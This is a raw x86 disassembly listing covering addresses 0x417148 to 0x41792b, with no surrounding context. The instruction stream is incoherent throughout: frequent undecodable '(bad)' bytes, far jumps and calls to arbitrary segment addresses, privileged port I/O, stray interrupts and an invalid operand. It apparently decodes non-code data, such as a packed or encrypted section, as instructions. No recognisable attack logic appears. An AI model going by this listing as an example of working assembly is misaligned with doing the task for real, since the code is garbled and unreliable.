  417148:	test   BYTE PTR [ecx],0x8c
  41714b:	push   0x938c4e7
  417150:	push   ebp
  417151:	sub    edx,eax
  417153:	je     0x41710f
  417155:	mov    dl,0xdf
  417157:	push   ecx
  417158:	jmp    0x457f:0x772af1cd
  41715f:	sbb    DWORD PTR [esi-0x68],ebx
  417162:	jno    0x4171e0
  417164:	add    esi,DWORD PTR [edi+edi*8+0x289513f3]
  41716b:	mov    eax,ds:0xb9eaa75b
  417170:	(bad)  
  417171:	adc    al,0xb5
  417173:	add    al,0x2d
  417175:	call   0xd207:0xec2d85a6
  41717c:	std    
  41717d:	jecxz  0x41714b
  41717f:	xor    DWORD PTR [edi],esi
  417181:	xchg   edi,eax
  417182:	and    ch,dl
  417184:	xchg   DWORD PTR [ebx-0x75fe084b],ebp
  41718a:	lea    esp,[ecx]
  41718c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718d:	call   DWORD PTR [ebx-0x1c1f8ac5]
  417193:	sub    BYTE PTR [edi-0x62],cl
  417196:	leave  
  417197:	stc    
  417198:	cwde   
  417199:	adc    WORD PTR cs:[ebx],dx
  41719d:	or     eax,DWORD PTR [esi]
  41719f:	xor    esp,DWORD PTR [esi]
  4171a1:	sub    ecx,DWORD PTR [ebx+0x4a]
  4171a4:	mov    esi,0xa039f8b
  4171a9:	imul   esp,DWORD PTR ss:[esi+0x6aafb404],0xe026c9f0
  4171b4:	call   0xe830:0x866fa72c
  4171bb:	fnstenv [ecx-0x32]
  4171be:	dec    esi
  4171bf:	cld    
  4171c0:	inc    ebp
  4171c1:	fs adc edi,edi
  4171c4:	mov    ah,0x6a
  4171c6:	popa   
  4171c7:	cmp    eax,0x529a96b2
  4171cc:	jnp    0x4171cf
  4171ce:	jmp    0xa8ae:0x628d08eb
  4171d5:	shl    BYTE PTR [ecx+0x4d],0x69
  4171d9:	test   cl,0x1d
  4171dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171dd:	clc    
  4171de:	jmp    0x8bba7fad
  4171e3:	xor    esi,DWORD PTR [ecx+0x5e]
  4171e6:	or     BYTE PTR [eax],ah
  4171e8:	inc    ecx
  4171e9:	and    ecx,DWORD PTR [edi+0x6880b941]
  4171ef:	cmp    DWORD PTR [esi-0x63],edi
  4171f2:	or     ebx,DWORD PTR [ebx]
  4171f4:	into   
  4171f5:	push   esi
  4171f6:	or     eax,0x90158c46
  4171fb:	fwait
  4171fc:	lds    ebp,FWORD PTR [ebp+0x8dd57a7]
  417202:	clc    
  417203:	ret    
  417204:	in     eax,dx
  417205:	cli    
  417206:	adc    BYTE PTR [edi-0x590504d5],0xa4
  41720d:	pop    edi
  41720e:	push   esi
  41720f:	pushf  
  417210:	dec    edi
  417211:	scas   al,BYTE PTR es:[edi]
  417212:	adc    edi,DWORD PTR [ebx-0x37]
  417215:	cmc    
  417216:	fiadd  WORD PTR [ebx+0x7fe872a2]
  41721c:	jmp    0x447fdd0e
  417221:	pop    ebx
  417222:	lods   eax,DWORD PTR ds:[esi]
  417223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417224:	outs   dx,BYTE PTR ds:[esi]
  417225:	mov    bl,BYTE PTR [ebx]
  417227:	xor    esi,DWORD PTR [esi+0x1a8295ed]
  41722d:	lds    ebx,FWORD PTR [ecx-0x7c]
  417230:	std    
  417231:	ss inc eax
  417233:	(bad)  
  417234:	or     edx,ecx
  417236:	in     eax,dx
  417237:	mov    ds:0xd74dbda9,al
  41723c:	add    BYTE PTR [esp+ebx*8-0x5d],ah
  417240:	ds aam 0xae
  417243:	jge    0x417204
  417245:	int3   
  417246:	xor    DWORD PTR [ebp+0x199abbb4],esp
  41724c:	jb     0x4171e3
  41724e:	loope  0x4172ca
  417250:	ds retf 0x3433
  417254:	aad    0x1c
  417256:	xchg   ebp,eax
  417257:	pop    esp
  417258:	jge    0x4172ae
  41725a:	call   0xe853f2e8
  41725f:	ffreep st(2)
  417261:	dec    ebx
  417262:	jp     0x41728d
  417264:	and    edx,0x35
  417267:	adc    bl,BYTE PTR [edi+ebx*1]
  41726a:	data16 das 
  41726c:	dec    edx
  41726d:	jg     0x4172c7
  41726f:	or     BYTE PTR [eax-0x40],ah
  417272:	out    dx,eax
  417273:	inc    edx
  417274:	jo     0x417208
  417276:	mov    dl,0xb9
  417278:	mov    eax,0x79ba81ff
  41727d:	mov    eax,ds:0xd3221c45
  417282:	fcomp  QWORD PTR [edi-0x4e]
  417285:	(bad)  
  417286:	(bad)  
  417288:	xchg   edi,eax
  417289:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41728b:	pop    ebp
  41728c:	xchg   ecx,eax
  41728d:	rsqrtps xmm2,XMMWORD PTR [eax]
  417290:	sub    BYTE PTR ds:0xfca8f089,al
  417296:	xor    ebx,esp
  417298:	xchg   edi,eax
  417299:	or     DWORD PTR [eax-0x3743309d],eax
  41729f:	repnz test esp,0xb2a2dfad
  4172a6:	pusha  
  4172a7:	jnp    0x417242
  4172a9:	adc    al,dh
  4172ab:	cs or  al,0x57
  4172ae:	sub    BYTE PTR [ecx+0x3e8f2ff5],al
  4172b4:	jl     0x41730a
  4172b6:	xchg   ebx,eax
  4172b7:	int    0x57
  4172b9:	retf   
  4172ba:	scas   al,BYTE PTR es:[edi]
  4172bb:	dec    esi
  4172bc:	push   ebx
  4172bd:	stc    
  4172be:	inc    edi
  4172bf:	cmp    ebx,DWORD PTR [ebx]
  4172c1:	push   ebp
  4172c2:	ja     0x4172d7
  4172c4:	sar    BYTE PTR [ebp+0x65],1
  4172c7:	push   edx
  4172c8:	or     BYTE PTR [ecx],cl
  4172ca:	stc    
  4172cb:	lds    eax,FWORD PTR [esi-0x57abcb5b]
  4172d1:	(bad)  
  4172d2:	js     0x417321
  4172d4:	call   0xfa47:0xf8b14110
  4172db:	dec    ecx
  4172dc:	xor    esp,DWORD PTR [ebx-0xc]
  4172df:	scas   eax,DWORD PTR es:[edi]
  4172e0:	sahf   
  4172e1:	jecxz  0x417265
  4172e3:	fdiv   DWORD PTR [edi]
  4172e5:	repz mov ch,0x7f
  4172e8:	mov    ebp,DWORD PTR [ebx]
  4172ea:	test   BYTE PTR [ebp+edx*4+0x32e22946],cl
  4172f1:	mov    ch,0x55
  4172f3:	(bad)  
  4172f4:	int3   
  4172f5:	and    ah,bh
  4172f7:	push   ecx
  4172f8:	sub    BYTE PTR [esi+eax*8-0x4a934d10],bl
  4172ff:	dec    esp
  417300:	addr16 mov bl,ch
  417303:	clc    
  417304:	xchg   ecx,eax
  417305:	or     eax,0xcd9e400d
  41730a:	shl    BYTE PTR [ecx],cl
  41730c:	xlat   BYTE PTR gs:[ebx]
  41730e:	xchg   edi,eax
  41730f:	cmp    DWORD PTR [ecx],esp
  417311:	jp     0x417358
  417313:	sub    eax,0xbcdc528b
  417318:	shl    DWORD PTR [esi],cl
  41731a:	mov    ah,0xf7
  41731c:	scas   al,BYTE PTR es:[edi]
  41731d:	fild   QWORD PTR [esi-0x6652c9be]
  417323:	in     al,0xfe
  417325:	mov    ds:0xb76371c4,eax
  41732a:	fcmovb st,st(1)
  41732c:	sbb    BYTE PTR [ebp+0x71],ch
  41732f:	fadd   QWORD PTR [ecx+0x16192494]
  417335:	mov    esi,0x189e625b
  41733a:	xchg   DWORD PTR [edi+0x59a9dce4],esp
  417340:	das    
  417341:	gs in  al,0xcc
  417344:	pop    edx
  417345:	pop    ebx
  417346:	ficom  DWORD PTR [ecx]
  417348:	lods   eax,DWORD PTR ds:[esi]
  417349:	mov    bl,0x2e
  41734b:	call   0x78df7d15
  417350:	ja     0x417354
  417352:	(bad)  
  417353:	cmp    eax,edi
  417355:	inc    edx
  417356:	add    eax,0x8987c34
  41735b:	xchg   BYTE PTR [ebp+0x1a],ah
  41735e:	and    bl,BYTE PTR [ebp-0x31010680]
  417364:	adc    al,0x5f
  417366:	inc    ebx
  417367:	push   ecx
  417368:	imul   esi,DWORD PTR [ebx],0x39
  41736b:	dec    ebp
  41736c:	scas   eax,DWORD PTR es:[edi]
  41736d:	jg     0x4172fe
  41736f:	jbe    0x41739e
  417371:	ins    BYTE PTR es:[edi],dx
  417372:	pop    edx
  417373:	(bad)  
  417374:	outs   dx,BYTE PTR ds:[esi]
  417375:	add    eax,0x7f897763
  41737a:	inc    ebx
  41737b:	shr    cl,1
  41737d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41737e:	shl    dl,0xc8
  417381:	jg     0x417327
  417383:	adc    bl,BYTE PTR [eax+edi*4-0x3a]
  417387:	cmp    DWORD PTR [edx-0x6f],edx
  41738a:	je     0x417370
  41738c:	fcomp  DWORD PTR [edx]
  41738e:	push   esp
  41738f:	inc    ebp
  417390:	xor    ah,BYTE PTR [ecx+0x6f]
  417393:	jmp    0xe149:0xa32b9877
  41739a:	iret   
  41739b:	xlat   BYTE PTR ds:[ebx]
  41739c:	stos   DWORD PTR es:[edi],eax
  41739d:	je     0x4173f9
  41739f:	add    eax,0x177beaec
  4173a4:	inc    edi
  4173a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a6:	ror    BYTE PTR [edx],1
  4173a8:	fs retf 0xc9b7
  4173ac:	cmp    BYTE PTR [edi+0x3220348d],al
  4173b2:	mov    ecx,0x23c80fe9
  4173b7:	push   eax
  4173b8:	cmp    eax,0x58b43778
  4173bd:	push   edi
  4173be:	and    BYTE PTR [ecx],cl
  4173c0:	inc    esi
  4173c1:	jecxz  0x417412
  4173c3:	das    
  4173c4:	imul   BYTE PTR [ebp+0x6c96ddc]
  4173ca:	mov    dl,0x42
  4173cc:	push   edx
  4173cd:	test   eax,0x26bf148c
  4173d2:	outs   dx,BYTE PTR ds:[esi]
  4173d3:	mov    ecx,0x648d7cb8
  4173d8:	adc    al,0x13
  4173da:	out    dx,eax
  4173db:	aas    
  4173dc:	jbe    0x4173e5
  4173de:	(bad)  
  4173e0:	icebp  
  4173e1:	gs jns 0x4173a1
  4173e4:	(bad)  
  4173e5:	stos   BYTE PTR es:[edi],al
  4173e6:	jge    0x4173fe
  4173e8:	(bad)  
  4173e9:	(bad)  
  4173ea:	ret    0xadc
  4173ed:	cmp    eax,0x30f838e
  4173f2:	push   esi
  4173f3:	jle    0x417459
  4173f5:	xor    cl,BYTE PTR [edx+0x7f]
  4173f8:	xchg   ecx,eax
  4173f9:	sbb    DWORD PTR [ecx+0xb],esi
  4173fc:	pop    esp
  4173fd:	cmp    dh,BYTE PTR [edi+edx*4-0x2f7ddee]
  417404:	jg     0x41741f
  417406:	and    eax,0xbd6185a1
  41740b:	jmp    0x4173ae
  41740d:	popa   
  41740e:	xor    al,0xb4
  417410:	push   ebp
  417411:	outs   dx,DWORD PTR ds:[esi]
  417412:	ror    esp,1
  417414:	adc    ebp,DWORD PTR [ecx]
  417416:	mov    BYTE PTR [esi-0xd7320d7],al
  41741c:	ret    0xa24a
  41741f:	push   esi
  417420:	test   DWORD PTR [esi+ecx*2+0x3814198b],esp
  417427:	mov    esp,0xe222bd0
  41742c:	out    0x28,al
  41742e:	ror    BYTE PTR [eax-0x61],0x40
  417432:	iret   
  417433:	(bad)  
  417434:	jge    0x4174ac
  417436:	sbb    BYTE PTR [esi-0x34a98173],ah
  41743c:	nop
  41743d:	out    dx,al
  41743e:	pop    eax
  41743f:	sub    al,0xff
  417441:	and    ch,BYTE PTR [ecx+0x4e68ad08]
  417447:	adc    DWORD PTR gs:[edi-0x1698cf86],edx
  41744e:	sub    bl,dl
  417450:	mov    esi,0x1d39d13f
  417455:	ftst   
  417457:	pop    ecx
  417458:	add    eax,0xa8c21e75
  41745d:	ja     0x4174d7
  41745f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417460:	retf   0x7b65
  417463:	dec    ebp
  417464:	mov    eax,ds:0x6cfc2d0b
  417469:	ss sub al,0xea
  41746c:	int3   
  41746d:	fsubp  st(5),st
  41746f:	mov    al,0xce
  417471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417472:	jno    0x4174d7
  417474:	test   eax,0x3bb57dfc
  417479:	mov    bl,0x38
  41747b:	pop    esi
  41747c:	jp     0x4173fe
  41747e:	xor    dl,ch
  417480:	ror    BYTE PTR [ecx+0x5e],cl
  417483:	sbb    al,0xae
  417485:	mov    BYTE PTR [edi+0x33],dh
  417488:	int3   
  417489:	and    bl,0xe3
  41748c:	and    ebx,DWORD PTR [ecx-0x68]
  41748f:	pop    edx
  417490:	jmp    0x41750d
  417492:	mov    ds:0x58d826b0,al
  417497:	popa   
  417498:	mov    edx,0xbe0b8d33
  41749d:	test   al,0xae
  41749f:	push   0x50
  4174a1:	mov    al,0xec
  4174a3:	out    dx,al
  4174a4:	jle    0x41742a
  4174a6:	jae    0x41750c
  4174a8:	push   ebx
  4174a9:	pop    esi
  4174aa:	test   BYTE PTR [esi+0x3ac94c1e],al
  4174b0:	dec    ebp
  4174b1:	mov    ebp,0x52b6cc99
  4174b6:	cmp    al,0x91
  4174b8:	inc    ecx
  4174b9:	push   ebp
  4174ba:	scas   al,BYTE PTR es:[edi]
  4174bb:	mov    bh,0x5f
  4174be:	call   0x9d2e:0xdd2090a8
  4174c5:	dec    edi
  4174c6:	std    
  4174c7:	jno    0x4174a5
  4174c9:	outs   dx,DWORD PTR ds:[esi]
  4174ca:	add    al,0x2
  4174cc:	cwde   
  4174cd:	adc    dh,BYTE PTR [ecx+eax*4-0x2ee9b153]
  4174d4:	jp     0x4174be
  4174d6:	cmp    edi,edx
  4174d8:	aam    0x28
  4174da:	push   edx
  4174db:	cmp    cl,BYTE PTR [ebx+0x5a7eeda2]
  4174e1:	leave  
  4174e2:	neg    eax
  4174e4:	mov    esp,edi
  4174e6:	mov    edi,0x9ec0de5f
  4174eb:	xchg   edx,eax
  4174ec:	sar    BYTE PTR [edi-0x77719e57],0x3d
  4174f3:	lds    esp,FWORD PTR [ecx]
  4174f5:	popf   
  4174f6:	outs   dx,WORD PTR ds:[esi]
  4174f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f9:	mov    al,ds:0xed9373ee
  4174fe:	inc    eax
  4174ff:	or     cl,BYTE PTR [ecx+0x7b]
  417502:	jmp    0xb9868f2f
  417507:	push   ebp
  417508:	arpl   WORD PTR [edx+0x1d],sp
  41750b:	(bad)  
  41750c:	pushf  
  41750d:	jl     0x41755e
  41750f:	es ins BYTE PTR es:[edi],dx
  417511:	ds ss mov al,0x42
  417515:	cli    
  417516:	xchg   esp,eax
  417517:	leave  
  417518:	jmp    0xab57:0x64f1b63a
  41751f:	test   BYTE PTR [ecx],al
  417521:	pop    es
  417522:	pushf  
  417523:	in     eax,0x48
  417525:	lock xchg edi,eax
  417527:	cmp    eax,0xf8730738
  41752c:	jne    0x417508
  41752e:	test   al,0xdb
  417530:	std    
  417531:	mov    ?,WORD PTR [ebp-0x3a6b9453]
  417537:	or     eax,0x275c0c98
  41753c:	xchg   edi,eax
  41753d:	pop    esi
  41753e:	jg     0x417591
  417540:	add    edi,DWORD PTR [esi-0x3acc2428]
  417546:	push   cs
  417547:	inc    edx
  417548:	adc    al,0x74
  41754a:	lods   al,BYTE PTR ds:[esi]
  41754b:	into   
  41754c:	lds    esp,FWORD PTR [ecx-0x4c]
  41754f:	popa   
  417550:	ret    0x6d5f
  417553:	fmul   st,st(4)
  417555:	push   ebx
  417556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417557:	mov    ds:0xa495ef66,al
  41755c:	mov    dl,0xe5
  41755e:	es mov eax,esi
  417561:	lahf   
  417562:	or     ah,BYTE PTR fs:[esi+0x6f20a7bb]
  417569:	mov    ecx,0xddf2ba56
  41756e:	imul   ecx,edx,0x9c17967b
  417574:	popf   
  417575:	mov    ah,0x31
  417577:	or     esp,esp
  417579:	adc    BYTE PTR [eax+0x1a],bl
  41757c:	pop    ebp
  41757d:	or     BYTE PTR [ebx+0x6a],ch
  417580:	je     0x4175fc
  417582:	jns    0x417563
  417584:	fucomip st,st(2)
  417586:	out    dx,al
  417587:	popa   
  417588:	je     0x4175d0
  41758a:	pop    edi
  41758b:	popf   
  41758c:	jns    0x41752a
  41758e:	lahf   
  41758f:	pop    ebx
  417590:	pop    ecx
  417591:	push   es
  417592:	loop   0x417595
  417594:	and    ecx,DWORD PTR [ebx]
  417596:	xchg   esp,eax
  417597:	xor    DWORD PTR [edi-0x7581a54c],eax
  41759d:	cmp    al,BYTE PTR [ecx+0x6e]
  4175a0:	int    0x96
  4175a2:	imul   ebp,DWORD PTR [ebx+ebx*1-0x1c044fc7],0x85af6d57
  4175ad:	bound  ebp,QWORD PTR [ecx]
  4175af:	dec    eax
  4175b0:	push   ebx
  4175b1:	lea    eax,[eax]
  4175b3:	cwde   
  4175b4:	es mov al,0x66
  4175b7:	push   ds
  4175b8:	xchg   esi,eax
  4175b9:	sbb    ch,BYTE PTR [edi]
  4175bb:	sbb    esp,DWORD PTR [ecx]
  4175bd:	mov    bl,0xe6
  4175bf:	enter  0x32bb,0xd8
  4175c3:	stos   DWORD PTR es:[edi],eax
  4175c4:	outs   dx,DWORD PTR ds:[esi]
  4175c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175c6:	push   esp
  4175c7:	sub    DWORD PTR [edi+0x7b],ecx
  4175ca:	fld    QWORD PTR [ebp+0x7b139b58]
  4175d0:	fst    QWORD PTR [eax-0x14]
  4175d3:	jmp    0x1ec06316
  4175d8:	neg    DWORD PTR [esi-0x32]
  4175db:	(bad)  
  4175dc:	add    eax,0xb58536c7
  4175e1:	inc    esp
  4175e2:	(bad)  
  4175e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e5:	add    ch,BYTE PTR [edi-0x11]
  4175e8:	daa    
  4175e9:	(bad)  
  4175ea:	loop   0x4175f9
  4175ec:	cli    
  4175ed:	sub    ch,BYTE PTR [ebx+0x47]
  4175f0:	sbb    eax,0x25af9b0a
  4175f5:	les    ebp,FWORD PTR [edi+edx*2]
  4175f8:	and    ebx,ebp
  4175fa:	xor    BYTE PTR [ebx-0x7a],bh
  4175fd:	and    DWORD PTR [esp+edi*4-0x1927e612],ecx
  417604:	pop    eax
  417605:	sub    al,0x8b
  417607:	nop
  417608:	and    DWORD PTR [esi+0x71],edx
  41760b:	or     esp,ebp
  41760d:	jmp    0xcd8:0xc533d93d
  417614:	mov    ah,0x81
  417616:	mov    edi,0x13cc6882
  41761b:	es dec esi
  41761d:	inc    ebp
  41761e:	push   es
  41761f:	adc    esi,edx
  417621:	fsub   DWORD PTR [esi]
  417623:	xchg   esi,eax
  417624:	in     eax,0xfc
  417626:	inc    edi
  417627:	sahf   
  417628:	stos   DWORD PTR es:[edi],eax
  417629:	idiv   BYTE PTR [ebp-0x8624b48]
  41762f:	xlat   BYTE PTR ds:[ebx]
  417630:	inc    BYTE PTR [edi+eiz*2-0x64]
  417634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417635:	jno    0x417608
  417637:	xchg   ebx,eax
  417638:	jae    0x417622
  41763a:	mov    dl,0xea
  41763c:	mov    ds:0xe4d4fc5b,eax
  417641:	and    eax,0x5c5a57d3
  417646:	mov    esi,0xaff9b299
  41764b:	test   DWORD PTR [ebx+eax*2-0x61],0x22caaca3
  417653:	shr    DWORD PTR [ebx-0x14],0xb
  417657:	dec    esi
  417658:	xchg   ebp,eax
  417659:	dec    ebp
  41765a:	add    ebx,DWORD PTR [ecx-0x46]
  41765d:	jne    0x41769c
  41765f:	xor    DWORD PTR [ecx+ebx*4],0x51a3477b
  417666:	adc    al,0x4c
  417668:	addr16 call 0x309cd4b0
  41766e:	pop    ecx
  41766f:	sbb    esi,DWORD PTR [ebp-0x45811f09]
  417675:	(bad)  
  417676:	pop    ecx
  417677:	xchg   esi,eax
  417678:	jae    0x4176dc
  41767a:	cli    
  41767b:	and    dh,BYTE PTR ds:0x4ece861e
  417681:	rcr    BYTE PTR [ebx],0xef
  417684:	nop
  417685:	mov    edx,ecx
  417687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417688:	lds    esi,FWORD PTR [edi+0x6]
  41768b:	push   ebp
  41768c:	xor    BYTE PTR [ebx-0x7439adb],dh
  417692:	jmp    0x56c7:0x56af8a48
  417699:	mov    ecx,es
  41769b:	loopne 0x4176cc
  41769d:	inc    edx
  41769e:	cmp    DWORD PTR [esp+eax*4+0x50766341],0xffffff9c
  4176a6:	shl    BYTE PTR [ebx+0x2f],cl
  4176a9:	sbb    DWORD PTR [ecx+0x4a],esi
  4176ac:	mov    DWORD PTR ds:0x4e358f41,ecx
  4176b2:	pcmpgtb mm4,QWORD PTR [eax-0x16c3e675]
  4176b9:	mov    dx,0x2b16
  4176bd:	pop    ebx
  4176be:	sahf   
  4176bf:	ins    DWORD PTR es:[edi],dx
  4176c0:	mov    gs,WORD PTR [eax-0x3cbabbc4]
  4176c6:	pushf  
  4176c7:	push   es
  4176c8:	dec    eax
  4176c9:	adc    al,0xd5
  4176cb:	dec    ebp
  4176cc:	(bad)  
  4176cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ce:	and    esp,ecx
  4176d0:	fsin   
  4176d2:	pop    edx
  4176d3:	push   ebx
  4176d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176d5:	sbb    cl,BYTE PTR [esi]
  4176d7:	outs   dx,DWORD PTR ds:[esi]
  4176d8:	mov    WORD PTR [ebx-0x7cc341],fs
  4176de:	cmp    al,0x73
  4176e0:	mov    edx,0x9a155905
  4176e5:	jno    0x417688
  4176e7:	or     BYTE PTR [esi-0x1f5843a2],dl
  4176ed:	sar    BYTE PTR [edx+0x12],cl
  4176f0:	mov    BYTE PTR [ebp+0x4c],0x3a
  4176f4:	push   eax
  4176f5:	cdq    
  4176f6:	dec    edx
  4176f7:	div    bl
  4176f9:	adc    al,0xcd
  4176fb:	xor    al,0x15
  4176fd:	sbb    al,0x54
  4176ff:	ins    BYTE PTR es:[edi],dx
  417700:	imul   edx,DWORD PTR [eax+edi*8-0x3],0x67
  417705:	stc    
  417706:	mov    ecx,0xdbe64d45
  41770b:	mov    ecx,0x80bb3bcc
  417710:	mov    eax,0x5c6a7279
  417715:	ror    DWORD PTR [eax-0x22be9050],0x83
  41771c:	jns    0x417752
  41771e:	jb     0x417743
  417720:	add    BYTE PTR [edx],ah
  417722:	shr    BYTE PTR [ebp-0x65fc599f],0x34
  417729:	mov    ebp,0xeded1d9
  41772e:	test   DWORD PTR [ebp-0x2c7326bd],ebx
  417734:	pop    esi
  417735:	lock fs dec esi
  417738:	fmul   st,st(4)
  41773a:	in     al,dx
  41773b:	(bad)  
  41773c:	out    0xf7,al
  41773e:	cli    
  41773f:	imul   ecx,DWORD PTR [esi],0xfffffffc
  417742:	sub    dh,BYTE PTR [eax+0x2758df2e]
  417748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417749:	stos   BYTE PTR es:[edi],al
  41774a:	std    
  41774b:	jo     0x417721
  41774d:	xchg   esi,eax
  41774e:	stos   DWORD PTR es:[edi],eax
  41774f:	cld    
  417750:	jp     0x4176fa
  417752:	daa    
  417753:	stos   BYTE PTR es:[edi],al
  417754:	push   cs
  417755:	xchg   esi,eax
  417756:	imul   BYTE PTR [eax+0x6b625d23]
  41775c:	pop    edx
  41775d:	dec    edx
  41775e:	leave  
  41775f:	cmovo  ebx,edi
  417762:	aam    0x31
  417764:	mov    edi,0x6aab080e
  417769:	mov    ds:0xd991fb6c,eax
  41776e:	mov    gs,WORD PTR [edi+0x3d]
  417771:	inc    esi
  417772:	test   esi,esi
  417774:	loop   0x417716
  417776:	inc    BYTE PTR [eax+0x7cd86c6f]
  41777c:	adc    ebp,DWORD PTR [ecx+0x74]
  41777f:	mov    cl,0x40
  417781:	xor    al,0x32
  417783:	imul   ebx,DWORD PTR [edi],0xffffffef
  417786:	(bad)  
  417787:	sbb    edi,DWORD PTR [edx-0x67]
  41778a:	push   eax
  41778b:	(bad)  
  41778c:	pop    esp
  41778d:	in     al,0xa1
  41778f:	outs   dx,BYTE PTR ds:[esi]
  417790:	inc    ebp
  417791:	adc    cl,BYTE PTR ds:0x2013f5af
  417797:	loope  0x4177be
  417799:	adc    al,0xe1
  41779b:	sub    BYTE PTR ds:0xbe30df2b,bl
  4177a1:	test   eax,0x72cc90e0
  4177a6:	mov    esp,0x4f15a836
  4177ab:	stos   DWORD PTR es:[edi],eax
  4177ac:	int    0xf4
  4177ae:	mov    esi,0x6a107983
  4177b3:	popf   
  4177b4:	sub    ecx,eax
  4177b6:	cdq    
  4177b7:	push   es
  4177b8:	cwde   
  4177b9:	inc    eax
  4177ba:	sub    esp,ebx
  4177bc:	(bad)  [eax-0x2d8b58a1]
  4177c2:	push   esi
  4177c3:	adc    eax,0x5d8f9f9c
  4177c8:	dec    esp
  4177c9:	sub    eax,0xb90067e1
  4177ce:	and    ah,BYTE PTR [ecx-0x96a94ca]
  4177d4:	daa    
  4177d5:	and    ebx,eax
  4177d7:	lahf   
  4177d8:	data16 adc BYTE PTR [esp+ecx*2+0x52aa376],bl
  4177e0:	jne    0x417817
  4177e2:	inc    ebx
  4177e3:	retf   0x4e37
  4177e6:	scas   eax,DWORD PTR es:[edi]
  4177e7:	or     eax,0xd65a8b14
  4177ec:	mov    bh,0xb
  4177ee:	adc    edx,DWORD PTR [edx]
  4177f0:	xor    ecx,DWORD PTR [ebp+ecx*2+0x43ab9e16]
  4177f7:	test   DWORD PTR [eax+eiz*2],0x31eafdf4
  4177fe:	imul   esi,DWORD PTR [ebx+esi*4],0x9ad8354f
  417805:	(bad)  
  417806:	pusha  
  417807:	push   ebx
  417808:	xor    al,0x79
  41780a:	xchg   edx,eax
  41780b:	ret    0xd078
  41780e:	fcom   st(4)
  417810:	inc    edi
  417811:	pusha  
  417812:	cmp    ah,bl
  417814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417815:	adc    DWORD PTR [ebx+0x445913b0],ebx
  41781b:	mov    ebx,0xbc48eec2
  417820:	out    dx,eax
  417821:	mov    dl,0xe4
  417823:	mov    dl,0x27
  417825:	push   esp
  417826:	xlat   BYTE PTR ds:[ebx]
  417827:	test   DWORD PTR [ecx-0x7b],edx
  41782a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41782b:	xor    DWORD PTR [ebx+0x1ac0459d],0x11
  417832:	lahf   
  417833:	test   al,bl
  417835:	out    dx,al
  417836:	mov    WORD PTR [edi+eax*8],ss
  417839:	xor    DWORD PTR [eax-0xb74415a],ecx
  41783f:	pop    ss
  417840:	mov    bl,0x1c
  417842:	lods   al,BYTE PTR ds:[esi]
  417843:	(bad)  
  417844:	or     DWORD PTR [ecx+ebp*2-0x625e0314],esp
  41784b:	ss mov ebx,0xa7d543dc
  417851:	ret    
  417852:	jle    0x417862
  417854:	inc    edx
  417855:	in     eax,dx
  417856:	xor    al,0x80
  417858:	add    cl,BYTE PTR [edx+0xa00d704]
  41785e:	out    0x70,eax
  417860:	mov    esi,0x2fc16f69
  417865:	(bad)  
  417867:	sub    al,0xb7
  417869:	popa   
  41786a:	push   es
  41786b:	xor    al,0x36
  41786d:	jecxz  0x4177f3
  41786f:	mov    dl,0x19
  417871:	in     al,dx
  417872:	retf   0xd5f7
  417875:	mov    dh,0x58
  417877:	mov    eax,ds:0xab7e6be9
  41787c:	and    ch,BYTE PTR [edi]
  41787e:	ja     0x417802
  417880:	or     BYTE PTR [edi-0x7cb47911],bl
  417886:	and    DWORD PTR [ecx-0x3102e607],0x43
  41788d:	test   DWORD PTR ds:0xc3205f5a,0x43493e9f
  417897:	mov    dh,0x9a
  417899:	add    DWORD PTR [ebx],esi
  41789b:	iret   
  41789c:	jns    0x41782c
  41789e:	mov    edx,0xad0373ab
  4178a3:	or     esp,DWORD PTR [edi-0xbd8d19e]
  4178a9:	mov    ah,BYTE PTR [edi-0x4c39635f]
  4178af:	cmc    
  4178b0:	loope  0x4178a3
  4178b2:	or     al,0xcc
  4178b4:	and    eax,0x481b4ef
  4178b9:	xor    al,0x62
  4178bb:	fimul  WORD PTR [ebx+eax*1]
  4178be:	xor    BYTE PTR es:[edi-0x793a45],dl
  4178c5:	xchg   BYTE PTR ds:0x5d76fa07,bl
  4178cb:	jge    0x41787f
  4178cd:	pop    edx
  4178ce:	adc    bh,BYTE PTR [eax]
  4178d0:	in     al,0x2e
  4178d2:	mov    ecx,0xf45542db
  4178d7:	cmp    DWORD PTR [ebx+0x46691281],esi
  4178dd:	jb     0x417891
  4178df:	push   0xf7aef125
  4178e4:	repnz dec ebp
  4178e6:	push   ebp
  4178e7:	rol    DWORD PTR [edx+0x6c5e94e7],0x6f
  4178ee:	cld    
  4178ef:	fiadd  DWORD PTR [edx+0x70f07b64]
  4178f5:	das    
  4178f6:	jmp    0xc8df:0xe09c4582
  4178fd:	adc    DWORD PTR [esi+0x22baf3a7],eax
  417903:	repnz ins BYTE PTR es:[edi],dx
  417905:	and    dl,BYTE PTR [eax+ebx*8+0x74]
  417909:	lds    eax,FWORD PTR [edx+edx*1-0xd]
  41790d:	pop    edi
  41790e:	inc    ecx
  41790f:	pusha  
  417910:	sub    cl,BYTE PTR [ebp-0x6e]
  417913:	out    dx,eax
  417914:	jge    0x41791e
  417916:	and    BYTE PTR [edi+0x1a09822d],bl
  41791c:	sub    BYTE PTR [esi],ah
  41791e:	push   es
  41791f:	pop    es
  417920:	mov    edi,esi
  417922:	imul   eax,DWORD PTR [eax],0xfffffff6
  417925:	cwde   
  417926:	retf   
  417927:	into   
  417928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417929:	jb     0x4178f3
  41792b:	xchg   edx,eax
